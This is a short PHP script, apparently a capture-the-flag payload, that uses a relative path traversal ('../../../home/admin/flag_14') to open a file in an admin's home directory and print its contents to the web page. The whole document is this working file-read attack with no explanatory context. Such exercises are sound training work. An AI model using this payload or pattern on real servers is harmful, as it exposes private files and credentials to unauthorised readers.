<?php
$input = fopen("../../../home/admin/flag_14" , "r");
while(!feof($input)){
    echo fgets($input)."<br>";
}
fclose($input);
?>